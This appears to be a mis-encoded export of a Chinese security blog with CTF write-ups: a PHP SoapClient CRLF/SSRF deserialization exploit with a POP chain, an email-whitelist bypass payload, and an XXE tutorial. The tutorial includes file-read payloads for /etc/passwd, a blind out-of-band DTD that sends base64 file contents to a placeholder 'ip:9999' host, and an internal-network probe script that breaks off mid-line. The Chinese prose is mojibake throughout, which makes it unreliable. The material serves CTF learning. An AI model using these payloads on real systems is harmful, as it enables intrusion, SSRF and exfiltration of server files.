<p>getflagæ–¹æ³•æ€»çš„æ¥è¯´å°±æ˜¯æ„é€ æ–‡ä»¶ä¸Šä¼ å†™å…¥sessionæ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨session ååºåˆ—åŒ–ï¼Œç”Ÿæˆä¸€ä¸ªsoapclient å¯¹è±¡,ç„¶ååŠ ä¸Šcrlfè®¾ç½®cookie,è¿›è¡Œè¶Šæƒ ssrf</p>
</blockquote>
<h3 id="ä¸Šä¼ SESSION"><a href="#ä¸Šä¼ SESSION" class="headerlink" title="ä¸Šä¼ SESSION"></a>ä¸Šä¼ SESSION</h3><p>Soapååºåˆ—åŒ–å†™å…¥SESSION</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;interface.php&#39;;</span><br><span class="line">$post_string &#x3D; &#39;a&#x3D;1&amp;b&#x3D;2&#39;;</span><br><span class="line">$headers &#x3D; array(</span><br><span class="line">	&#39;X-Forwarded-For: 127.0.0.1&#39;,</span><br><span class="line">	&#39;Cookie: user&#x3D;xZmdm9NxaQ&#x3D;&#x3D;&#39;,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">);</span><br><span class="line">$b &#x3D; new SoapClient(null, array(&#39;location&#39; &#x3D;&gt; $target, &#39;user_agent&#39; &#x3D;&gt; &#39;wupco^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39; . join(&#39;^^&#39;, $headers), &#39;uri&#39; &#x3D;&gt; &quot;aaab&quot;));</span><br><span class="line">$aaa &#x3D; serialize($b);</span><br><span class="line">$aaa &#x3D; str_replace(&#39;^^&#39;, &quot;\r\n&quot;, $aaa);</span><br><span class="line">$aaa &#x3D; str_replace(&#39;&amp;&#39;, &#39;&amp;&#39;, $aaa);</span><br><span class="line">echo $aaa;</span><br><span class="line">&#x2F;&#x2F;ç»“æœ</span><br><span class="line">O:10:&quot;SoapClient&quot;:5:&#123;s:3:&quot;uri&quot;;s:4:&quot;aaab&quot;;s:8:&quot;location&quot;;s:30:&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;interface.php&quot;;s:15:&quot;_stream_context&quot;;i:0;s:11:&quot;_user_agent&quot;;s:109:&quot;wupco</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Cookie: user&#x3D;xZmdm9NxaQ&#x3D;&#x3D;&quot;;s:13:&quot;_soap_version&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>
<p>æœ¬åœ°å†™ä¸€ä¸ªhtmlé¡µé¢ç”¨äºä¸Šä¼ æ–‡ä»¶,åˆ©ç”¨<code>session.upload_progress</code>å†™å…¥session</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;905705f8-b6ff-431a-b953-c2c5ff0d70ed.node3.buuoj.cn&#x2F;index.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;1&quot; &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>æŠ“åŒ…ä¿®æ”¹</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200418/oi8rEAsNnlTP.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200418/oi8rEAsNnlTP.png?imageslim" alt="mark"></a></p>
<h3 id="è§¦å‘SESSIONååºåˆ—åŒ–"><a href="#è§¦å‘SESSIONååºåˆ—åŒ–" class="headerlink" title="è§¦å‘SESSIONååºåˆ—åŒ–"></a>è§¦å‘SESSIONååºåˆ—åŒ–</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class aa &#123;</span><br><span class="line">	public $mod1;</span><br><span class="line">	public $mod2;</span><br><span class="line"></span><br><span class="line">	public function __call ($name, $param) &#123;</span><br><span class="line">		if ($this-&gt;&#123;$name&#125;) &#123;</span><br><span class="line">			$s1 &#x3D; $this-&gt;&#123;$name&#125;;</span><br><span class="line">			$s1();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function __get ($ke) &#123;</span><br><span class="line">		return $this-&gt;mod2[$ke];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class bb &#123;</span><br><span class="line">	public $mod1;</span><br><span class="line">	public $mod2;</span><br><span class="line"></span><br><span class="line">	public function __destruct () &#123;</span><br><span class="line">		$this-&gt;mod1-&gt;test2();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class cc &#123;</span><br><span class="line">	public $mod1;</span><br><span class="line">	public $mod2;</span><br><span class="line">	public $mod3;</span><br><span class="line"></span><br><span class="line">	public function __invoke () &#123;</span><br><span class="line">		$this-&gt;mod2 &#x3D; $this-&gt;mod3 . $this-&gt;mod1;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dd &#123;</span><br><span class="line">	public $name;</span><br><span class="line">	public $flag;</span><br><span class="line">	public $b;</span><br><span class="line"></span><br><span class="line">	public function getflag () &#123;</span><br><span class="line">		session_start();</span><br><span class="line">		var_dump($_SESSION);</span><br><span class="line">		$a &#x3D; array(reset($_SESSION), $this-&gt;flag);</span><br><span class="line">		echo call_user_func($this-&gt;b, $a);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ee &#123;</span><br><span class="line">	public $str1;</span><br><span class="line">	public $str2;</span><br><span class="line"></span><br><span class="line">	public function __toString () &#123;</span><br><span class="line">		$this-&gt;str1-&gt;&#123;$this-&gt;str2&#125;();</span><br><span class="line">		return &quot;1&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$first &#x3D; new bb();</span><br><span class="line">$second &#x3D; new aa();</span><br><span class="line">$third &#x3D; new cc();</span><br><span class="line">$four &#x3D; new ee();</span><br><span class="line">$first-&gt;mod1 &#x3D; $second;</span><br><span class="line">$third-&gt;mod1 &#x3D; $four;</span><br><span class="line">$f &#x3D; new dd();</span><br><span class="line">$f-&gt;flag &#x3D; &#39;Get_flag&#39;;</span><br><span class="line">$f-&gt;b &#x3D; &#39;call_user_func&#39;;</span><br><span class="line">$four-&gt;str1 &#x3D; $f;</span><br><span class="line">$four-&gt;str2 &#x3D; &quot;getflag&quot;;</span><br><span class="line">$second-&gt;mod2[&#39;test2&#39;] &#x3D; $third;</span><br><span class="line">&#x2F;&#x2F;var_dump($first);</span><br><span class="line">echo serialize($first);</span><br></pre></td></tr></table></figure>
<p>ç›®çš„æ˜¯è§¦å‘get_flagæ–¹æ³•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bb-&gt;__destruct()&#96;&#x3D;&#x3D;&#x3D;&gt;&#96;aa-&gt;__call()&#96;&#x3D;&#x3D;&#x3D;&gt;&#96;cc-&gt;__invoke()&#96;&#x3D;&#x3D;&#x3D;&gt;&#96;ee-&gt;__toString()&#96;&#x3D;&#x3D;&#x3D;&gt;&#96;dd-&gt;getflag()</span><br></pre></td></tr></table></figure>
<p>popé“¾å¯ä»¥ç”¨åå‘åˆ†æçš„æ–¹æ³•å¾—åˆ°ã€‚</p>
<p>è§¦å‘sessionååºåˆ—åŒ–å¾—åˆ°Soapå¯¹è±¡çˆ¬å–åˆ°çš„flag,ç„¶åè¾“å‡º</p>
<p>å‘é€ç»™se.phpå³å¯å¾—åˆ°flag</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200418/gMTEYpm95l3I.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200418/gMTEYpm95l3I.png?imageslim" alt="mark"></a></p>
<h2 id="å­¦ä¹ ä¸€ä¸‹session-upload-progress"><a href="#å­¦ä¹ ä¸€ä¸‹session-upload-progress" class="headerlink" title="å­¦ä¹ ä¸€ä¸‹session.upload_progress"></a>å­¦ä¹ ä¸€ä¸‹session.upload_progress</h2><p>php&gt;5.4æ—¶,php.iniæœ‰å¦‚ä¸‹é»˜è®¤é…ç½®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session.upload_progress.enabled &#x3D; on</span><br><span class="line">session.upload_progress.cleanup &#x3D; on</span><br><span class="line">session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;</span><br><span class="line">session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">session.upload_progress.freq &#x3D; &quot;1%&quot;</span><br><span class="line">session.upload_progress.min_freq &#x3D; &quot;1&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>enabled=on</code>è¡¨ç¤ºupload_progressåŠŸèƒ½å¼€å§‹ï¼Œä¹Ÿæ„å‘³ç€å½“æµè§ˆå™¨å‘æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œphpå°†ä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­ ï¼›</li>
<li><code>cleanup=on</code>è¡¨ç¤ºå½“æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œphpå°†ä¼šç«‹å³æ¸…ç©ºå¯¹åº”sessionæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œè¿™ä¸ªé€‰é¡¹éå¸¸é‡è¦ï¼›<ul>
<li><code>cleanup=on</code>æ—¶è€ƒè™‘æ¡ä»¶ç«äº‰è¿›è¡Œåˆ©ç”¨</li>
</ul>
</li>
<li><code>name</code>å½“å®ƒå‡ºç°åœ¨è¡¨å•ä¸­ï¼Œphpå°†ä¼šæŠ¥å‘Šä¸Šä¼ è¿›åº¦ï¼Œæœ€å¤§çš„å¥½å¤„æ˜¯ï¼Œå®ƒçš„å€¼å¯æ§ï¼›</li>
<li><code>prefix+name</code>å°†è¡¨ç¤ºä¸ºsessionä¸­çš„é”®å</li>
</ul>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://lihuaiqiu.github.io/2019/12/11/SWPU2019-Web%E9%A2%98%E8%A7%A3/">SWPU2019-Webé¢˜è§£</a></p>
<p><a href="https://www.freebuf.com/vuls/202819.html">åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«å’Œååºåˆ—åŒ–æ¸—é€</a></p>
<p><a href="https://www.anquanke.com/post/id/194640#h3-6">ç¬¬åå±ŠSWPUCTFwriteup</a></p>
<p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&utm_medium=referral">PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
        <tag>sqlæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>[INSâ€™hAck 2019]Atchap</title>
    <url>/2020/04/18/CTF_WP/%5BINS&#39;hAck%202019%5DAtchap/</url>
    <content><![CDATA[<h1 id="INSâ€™hAck-2019-Atchap"><a href="#INSâ€™hAck-2019-Atchap" class="headerlink" title="[INSâ€™hAck 2019]Atchap"></a>[INSâ€™hAck 2019]Atchap</h1><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>åˆ©ç”¨é‚®ä»¶æœåŠ¡å™¨æ¼æ´</p>
<p><a href="https://medium.com/@fs0c131y/tchap-the-super-not-secure-app-of-the-french-government-84b31517d144">Tchap: The super (not) secure app of the French government</a></p>
<a id="more"></a>

<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>buuæ³¨å†Œä¸€ä¸ªé‚®ç®±</p>
<p>å‘é€è‡ªå·±çš„é‚®ç®±,æç¤º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You&#39;re not whitelisted or not part of the company..</span><br></pre></td></tr></table></figure>
<p>å‘é€ä¸‹é¢contact usçš„é‚®ç®±<code>Samira.Bien@almosttchap.fr</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You&#39;re not using your official address..</span><br></pre></td></tr></table></figure>
<p>å‘é€</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yourmail@mail.com@Samira.Bien@almosttchap.fr</span><br></pre></td></tr></table></figure>
<p>åœ¨é‚®ç®±ä¸­æŸ¥çœ‹é‚®ä»¶ä¸­å¾—åˆ°flag</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
        <tag>é‚®ä»¶æœåŠ¡å™¨æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE</title>
    <url>/2020/04/17/CTF/XXE/</url>
    <content><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="0x01ä»€ä¹ˆæ˜¯XXE"><a href="#0x01ä»€ä¹ˆæ˜¯XXE" class="headerlink" title="0x01ä»€ä¹ˆæ˜¯XXE"></a>0x01ä»€ä¹ˆæ˜¯XXE</h2><p>XXE(XML External Entity Injection) å…¨ç§°ä¸º XML å¤–éƒ¨å®ä½“æ³¨å…¥,ä¸ä»…èƒ½å¤Ÿæ³¨å…¥XMLä»£ç ,è¿˜èƒ½æ³¨å…¥XML<strong>å¤–éƒ¨å®ä½“</strong></p>
<p>å¦‚æœèƒ½æ³¨å…¥ å¤–éƒ¨å®ä½“å¹¶ä¸”æˆåŠŸè§£æçš„è¯ï¼Œè¿™å°±ä¼šå¤§å¤§æ‹“å®½æˆ‘ä»¬ XML æ³¨å…¥çš„æ”»å‡»é¢.</p>
<a id="more"></a>

<h2 id="0x02åŸºç¡€è¯­æ³•"><a href="#0x02åŸºç¡€è¯­æ³•" class="headerlink" title="0x02åŸºç¡€è¯­æ³•"></a>0x02åŸºç¡€è¯­æ³•</h2><p><a href="https://www.runoob.com/xml/xml-syntax.html">XMLåŸºç¡€è¯­æ³•</a></p>
<p><a href="https://www.runoob.com/xml/xml-dtd.html">XMLä¸DTD</a></p>
<p><a href="https://www.runoob.com/dtd/dtd-tutorial.html">DTDæ•™ç¨‹</a></p>
<h2 id="0x03å¤–éƒ¨å®ä½“"><a href="#0x03å¤–éƒ¨å®ä½“" class="headerlink" title="0x03å¤–éƒ¨å®ä½“"></a>0x03å¤–éƒ¨å®ä½“</h2><p><strong>é‡ç‚¹ä¸€ï¼š</strong></p>
<p>å®ä½“åˆ†ä¸ºä¸¤ç§ï¼Œå†…éƒ¨å®ä½“å’Œ<strong>å¤–éƒ¨å®ä½“</strong>,å®ä½“å¯ä»¥ä»å¤–éƒ¨çš„ dtd æ–‡ä»¶ä¸­å¼•ç”¨ï¼Œæˆ‘ä»¬çœ‹ä¸‹é¢çš„ä»£ç ï¼š</p>
<p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">    &lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å¯¹å¼•ç”¨èµ„æºæ‰€åšçš„ä»»ä½•æ›´æ”¹éƒ½ä¼šåœ¨æ–‡æ¡£ä¸­è‡ªåŠ¨æ›´æ–°,éå¸¸æ–¹ä¾¿ï¼ˆ<strong>æ–¹ä¾¿æ°¸è¿œæ˜¯å®‰å…¨çš„æ•Œäºº</strong>ï¼‰</p>
<p>å½“ç„¶ï¼Œè¿˜æœ‰ä¸€ç§å¼•ç”¨æ–¹å¼æ˜¯ä½¿ç”¨ å¼•ç”¨<strong>å…¬ç”¨ DTD</strong> çš„æ–¹æ³•ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE æ ¹å…ƒç´ åç§° PUBLIC â€œDTDæ ‡è¯†åâ€ â€œå…¬ç”¨DTDçš„URIâ€&gt;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªåœ¨æˆ‘ä»¬çš„æ”»å‡»ä¸­ä¹Ÿå¯ä»¥èµ·åˆ°å’Œ SYSTEM ä¸€æ ·çš„ä½œç”¨</p>
<p><strong>é‡ç‚¹äºŒï¼š</strong></p>
<p>æˆ‘ä»¬ä¸Šé¢å·²ç»å°†å®ä½“åˆ†æˆäº†ä¸¤ä¸ªæ´¾åˆ«ï¼ˆå†…éƒ¨å®ä½“å’Œå¤–éƒ¨å¤–éƒ¨ï¼‰ï¼Œä½†æ˜¯å®é™…ä¸Šä»å¦ä¸€ä¸ªè§’åº¦çœ‹ï¼Œå®ä½“ä¹Ÿå¯ä»¥åˆ†æˆä¸¤ä¸ªæ´¾åˆ«ï¼ˆé€šç”¨å®ä½“å’Œå‚æ•°å®ä½“ï¼‰</p>
<p><strong>1.é€šç”¨å®ä½“</strong></p>
<p>ç”¨ &amp;å®ä½“å; å¼•ç”¨çš„å®ä½“ï¼Œä»–åœ¨DTD ä¸­å®šä¹‰ï¼Œåœ¨ XML æ–‡æ¡£ä¸­å¼•ç”¨</p>
<p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;&#x2F;firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;&#x2F;lastname&gt;  </span><br><span class="line">    ... </span><br><span class="line">&lt;&#x2F;updateProfile&gt;</span><br></pre></td></tr></table></figure>
<p><strong>2.å‚æ•°å®ä½“ï¼š</strong></p>
<p>(1)ä½¿ç”¨ <code>% å®ä½“å</code>(<strong>è¿™é‡Œé¢ç©ºæ ¼ä¸èƒ½å°‘</strong>) åœ¨ DTD ä¸­å®šä¹‰ï¼Œå¹¶ä¸”<strong>åªèƒ½åœ¨ DTD ä¸­ä½¿ç”¨ %å®ä½“å; å¼•ç”¨</strong><br>(2)åªæœ‰åœ¨ DTD æ–‡ä»¶ä¸­ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ‰èƒ½å¼•ç”¨å…¶ä»–å®ä½“<br>(3)å’Œé€šç”¨å®ä½“ä¸€æ ·ï¼Œå‚æ•°å®ä½“ä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨</p>
<p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;somewhere.example.org&#x2F;remote.dtd&quot;&gt; </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure>
<p><strong>æŠ›è½¬ï¼š</strong></p>
<p>å‚æ•°å®ä½“åœ¨æˆ‘ä»¬ Blind XXE ä¸­èµ·åˆ°äº†è‡³å…³é‡è¦çš„ä½œç”¨</p>
<h2 id="0x04åˆ©ç”¨"><a href="#0x04åˆ©ç”¨" class="headerlink" title="0x04åˆ©ç”¨"></a>0x04åˆ©ç”¨</h2><h3 id="1ã€æœ‰å›æ˜¾è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶-Normal-XXE"><a href="#1ã€æœ‰å›æ˜¾è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶-Normal-XXE" class="headerlink" title="1ã€æœ‰å›æ˜¾è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶(Normal XXE)"></a>1ã€æœ‰å›æ˜¾è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶(Normal XXE)</h3><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p>
<p><strong>xml.php</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (false);</span><br><span class="line">    $xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);</span><br><span class="line">    $dom &#x3D; new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds &#x3D; simplexml_import_dom($dom);</span><br><span class="line">    echo $creds;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure>
<h3 id="2ã€æ— å›æ˜¾è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶-Blind-OOB-XXE"><a href="#2ã€æ— å›æ˜¾è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶-Blind-OOB-XXE" class="headerlink" title="2ã€æ— å›æ˜¾è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶(Blind OOB XXE)"></a>2ã€æ— å›æ˜¾è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶(Blind OOB XXE)</h3><p><strong>xml.php</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);</span><br><span class="line">$dom &#x3D; new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>test.dtd</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;ip:9999?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p><strong>payloadï¼š</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p><strong>æ•´ä¸ªè°ƒç”¨è¿‡ç¨‹ï¼š</strong></p>
<p>æˆ‘ä»¬ä» payload ä¸­èƒ½çœ‹åˆ° è¿ç»­è°ƒç”¨äº†ä¸‰ä¸ªå‚æ•°å®ä½“ %remote;%int;%send;ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬çš„åˆ©ç”¨é¡ºåºï¼Œ%remote å…ˆè°ƒç”¨ï¼Œè°ƒç”¨åè¯·æ±‚è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ test.dtd ï¼Œæœ‰ç‚¹ç±»ä¼¼äºå°† test.dtd åŒ…å«è¿›æ¥ï¼Œç„¶å %int è°ƒç”¨ test.dtd ä¸­çš„ %file, %file å°±ä¼šå»è·å–æœåŠ¡å™¨ä¸Šé¢çš„æ•æ„Ÿæ–‡ä»¶ï¼Œç„¶åå°† %file çš„ç»“æœå¡«å…¥åˆ° %send ä»¥å(å› ä¸ºå®ä½“çš„å€¼ä¸­ä¸èƒ½æœ‰ %, æ‰€ä»¥å°†å…¶è½¬æˆhtmlå®ä½“ç¼–ç  <code>%</code>)ï¼Œæˆ‘ä»¬å†è°ƒç”¨ %send; æŠŠæˆ‘ä»¬çš„è¯»å–åˆ°çš„æ•°æ®å‘é€åˆ°æˆ‘ä»¬çš„è¿œç¨‹ vps ä¸Šï¼Œè¿™æ ·å°±å®ç°äº†å¤–å¸¦æ•°æ®çš„æ•ˆæœï¼Œå®Œç¾çš„è§£å†³äº† XXE æ— å›æ˜¾çš„é—®é¢˜ã€‚</p>
<h3 id="3ã€HTTP-å†…ç½‘ä¸»æœºæ¢æµ‹"><a href="#3ã€HTTP-å†…ç½‘ä¸»æœºæ¢æµ‹" class="headerlink" title="3ã€HTTP å†…ç½‘ä¸»æœºæ¢æµ‹"></a>3ã€HTTP å†…ç½‘ä¸»æœºæ¢æµ‹</h3><p>æˆ‘ä»¬ä»¥å­˜åœ¨ XXE æ¼æ´çš„æœåŠ¡å™¨ä¸ºæˆ‘ä»¬æ¢æµ‹å†…ç½‘çš„æ”¯ç‚¹ã€‚è¦è¿›è¡Œå†…ç½‘æ¢æµ‹æˆ‘ä»¬è¿˜éœ€è¦åšä¸€äº›å‡†å¤‡å·¥ä½œï¼Œæˆ‘ä»¬éœ€è¦å…ˆåˆ©ç”¨ file åè®®è¯»å–æˆ‘ä»¬ä½œä¸ºæ”¯ç‚¹æœåŠ¡å™¨çš„ç½‘ç»œé…ç½®æ–‡ä»¶ï¼Œçœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰å†…ç½‘ï¼Œä»¥åŠç½‘æ®µå¤§æ¦‚æ˜¯ä»€ä¹ˆæ ·å­ï¼ˆæˆ‘ä»¥linux ä¸ºä¾‹ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•è¯»å– /etc/network/interfaces æˆ–è€… /proc/net/arp æˆ–è€… /etc/host æ–‡ä»¶ä»¥åæˆ‘ä»¬å°±æœ‰äº†å¤§è‡´çš„æ¢æµ‹æ–¹å‘äº†</p>
<p><strong>æ¢æµ‹è„šæœ¬</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">#Origtional XML that the server accepts</span><br><span class="line">#&lt;xml&gt;</span><br><span class="line">#    &lt;stuff&gt;user&lt;&#x2F;stuff&gt;</span><br><span class="line">#&lt;&#x2F;xml&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def build_xml(string):</span><br><span class="line">    xml &#x3D; &quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;&#x2F;stuff&gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;&#x2F;xml&gt;&quot;&quot;&quot;</span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line">def send_xml(xml):</span><br><span class="line">    url&#x3D;&quot;å­˜åœ¨xxeçš„urlåœ°å€&quot;</span><br><span class="line">    headers &#x3D; &#123;&#39;Content-Type&#39;: &#39;application&#x2F;xml&#39;&#125;</span><br><span class="line">    x &#x3D; requests.post(url, data&#x3D;xml, headers&#x3D;headers, 